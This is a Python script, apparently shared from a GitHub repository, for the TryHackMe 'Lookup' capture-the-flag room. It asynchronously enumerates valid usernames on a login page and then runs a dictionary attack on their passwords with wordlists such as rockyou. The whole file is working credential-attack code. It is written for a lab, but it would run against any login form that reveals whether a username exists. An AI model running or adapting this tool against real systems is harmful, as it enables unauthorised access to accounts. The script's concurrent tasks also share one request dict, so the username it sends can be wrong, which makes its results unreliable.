#!/usr/bin/python3

# Script for enumerating usernames from the login page of the "Lookup" room at TryHackMe.
# Built as a way to study async programming implementations with Python. As such, it may not be the most elegant solution to achieve the expected results.
# I encountered difficulties when attempting something similar during the "Capture" challenge, which led me to revisit this concept.
# This time, it worked well. I believe the main difference is that, unlike the "Capture" challenge where we needed to solve a CAPTCHA on subsequent requests,
# this challenge only requires sending requests to the API endpoint. Therefore, there is no significant drawback to sending a large number of requests at once,
# aside from the potential impact on server resources, which should be preserved.

import aiohttp  
import asyncio
import argparse
from termcolor import colored,cprint

parser = argparse.ArgumentParser(
    description='''Asynchronous login enumerator for LOOKUP TryHackMe challenge - Made for study purposes
    author: github.com/carlossb1''',
    epilog='Example: ./ghost.py -u http://target.com/login -l <wordlist>'
)
parser.add_argument('-u', '--url', required=True, help='Target login endpoit URL (for this challenge: http://<lookup.thm>/login.php')
parser.add_argument('-l', '--login', required=True, help='Path to usernames wordlist')
parser.add_argument('-P', '--password', required=True, help='Path to passwords wordlist')
args = parser.parse_args()


headers = { 
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = {
    'username': 'gambeta',
    'password': 'gambeta'
}

def banner():
    print("""

             ('-. .-.               .-')    .-') _   
            ( OO )  /              ( OO ). (  OO) )  
  ,----.    ,--. ,--. .-'),-----. (_)---\_)/     '._ 
 '  .-./-') |  | |  |( OO'  .-.  '/    _ | |'--...__)
 |  |_( O- )|   .|  |/   |  | |  |\  :` `. '--.  .--'
 |  | .--, \|       |\_) |  |\|  | '..`''.)   |  |   
(|  | '. (_/|  .-.  |  \ |  | |  |.-._)   \   |  |   
 |  '--'  | |  | |  |   `'  '-'  '\       /   |  |   
  `------'  `--' `--'     `-----'  `-----'    `--'   

""")

    print("TryHackMe lookup room")
    print("Username enumerator -  author: github.com/carlossb1")
    cprint("[!] This tool is not intended for use outside of this scope \n",'red')


valid_usernames = []

valid_creds = {}

async def validate_password(response_text):
    if 'wrong password' in response_text.lower():
        return False
    return True

async def brute_force_passwords(session,username,password):
    data['username'] = username
    data['password'] = password
    async with session.post(args.url,data=data,headers=headers) as response:
        response_text = await response.text()
        if await validate_password(response_text):
            cprint(f'[**] Valid credentials found: {username} : {password}','green')
            valid_creds[username] = password

async def validate_username(response_text):
    if 'wrong username' in response_text.lower():
        return False
    return True

async def send_request(session, username):
    data['username'] = username
    async with session.post(args.url, data=data, headers=headers) as response:
        response_text = await response.text()
        if await validate_username(response_text):
            cprint(f'[+] username found: {username}', 'green')
            valid_usernames.append(username)

async def main():

    try:
        with open(args.login, 'r',encoding='ISO-8859-1' ) as wordlist_file: #Changed encoding from UTF-8 to ISO to work with rockyou.txt
            usernames = [username.strip() for username in wordlist_file.readlines()]

        cprint(f'[!] Wordlist loaded successfully: {len(usernames)} usernames loaded','yellow')
        cprint(f'[!] Enumerating target {args.url} with provided usernames ...','yellow')
    except Exception as e:
        print(f'[!] An error ocurred while loading wordlist: {e}','red')

    try: 
        with open(args.password,'r',encoding='ISO-8859-1') as passwords_file:
            passwords = [password.strip() for password in passwords_file.readlines()]

        cprint(f'[!] Password list loaded sucessfully: {len(passwords)} passwords to guess','yellow')
    except Exception as e:
        print(f'[!] An error ocurred while loading passwords list: {e}','red')
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for username in usernames:
            task = asyncio.create_task(send_request(session, username))
            tasks.append(task)
        
        await asyncio.gather(*tasks)

        tasks2 = []
        for login in valid_usernames:
            cprint(f"[+] Starting dictionary attack on user: {login} ...",'blue')
            for password in passwords:
                task = asyncio.create_task(brute_force_passwords(session,login,password))
                tasks2.append(task)

            await asyncio.gather(*tasks2)

if __name__ == '__main__':
    banner()
    asyncio.run(main())

